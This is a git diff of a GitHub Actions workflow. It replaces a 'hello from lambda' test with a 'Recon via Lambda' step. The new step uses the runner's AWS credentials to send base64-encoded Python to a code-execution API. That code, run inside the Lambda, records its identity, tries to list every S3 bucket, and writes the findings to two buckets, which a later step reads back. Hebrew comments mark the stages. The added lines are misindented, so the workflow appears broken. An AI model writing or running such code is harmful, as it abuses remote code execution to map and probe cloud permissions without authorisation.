@@ -18,11 +18,11 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
         
-      - name: Debug code_exec
+      - name: Recon via Lambda
         run: |
           pip install requests requests-aws4auth --quiet
 
-                    cat > /tmp/test_api.py << 'EOF'
+          cat > /tmp/run.py << 'EOF'
           import boto3, json, base64, requests
           from requests_aws4auth import AWS4Auth
           
@@ -30,20 +30,46 @@ jobs:
           
           session = boto3.Session()
           creds = session.get_credentials().get_frozen_credentials()
-          auth = AWS4Auth(
-              creds.access_key,
-              creds.secret_key,
-              'us-east-1',
-              'execute-api',
-              session_token=creds.token
-          )
+          auth = AWS4Auth(creds.access_key, creds.secret_key, 'us-east-1', 'execute-api', session_token=creds.token)
           
-          code = base64.b64encode(b'print("hello from lambda")').decode()
-          print("payload:", repr(code))
+          def run(code):
+              r = requests.post(API, json={"code": base64.b64encode(code.encode()).decode()}, auth=auth)
+              print("->", r.status_code, r.text[:200])
           
-          r = requests.post(API, json={"code": code}, auth=auth)
-          print("status:", r.status_code)
-          print("body:", r.text)
-          EOF
+          # שלב 1: מי ה-Lambda + מה היא יכולה לכתוב
+          run("""
+          import boto3, json
+          s3 = boto3.client('s3', region_name='us-east-1')
+          sts = boto3.client('sts')
           
-                    python3 /tmp/test_api.py
+          results = {}
+          results['identity'] = str(sts.get_caller_identity())
+          
+          for b in ['userad88e2b168aa387e', 'logad88e2b168aa387e']:
+              try:
+                  s3.put_object(Bucket=b, Key='recon.json', Body=json.dumps(results))
+                  results['write_'+b] = 'OK'
+              except Exception as e:
+                  results['write_'+b] = str(e)
+
+                try:
+                    all_b = [x['Name'] for x in s3.list_buckets().get('Buckets',[])]
+                    results['all_buckets'] = all_b
+                except Exception as e:
+                    results['all_buckets'] = str(e)
+
+            # נסה לכתוב שוב עם הכל
+            for b in ['userad88e2b168aa387e', 'logad88e2b168aa387e']:
+                try:
+                    s3.put_object(Bucket=b, Key='recon.json', Body=json.dumps(results, default=str))
+                except: pass
+            """)
+            EOF
+                      python3 /tmp/run.py
+            
+                  - name: Read recon results from S3
+                    run: |
+                      echo "=== userad ==="
+                      aws s3 cp s3://userad88e2b168aa387e/recon.json - 2>&1
+                      echo "=== logad ==="
+                      aws s3 cp s3://logad88e2b168aa387e/recon.json - 2>&1
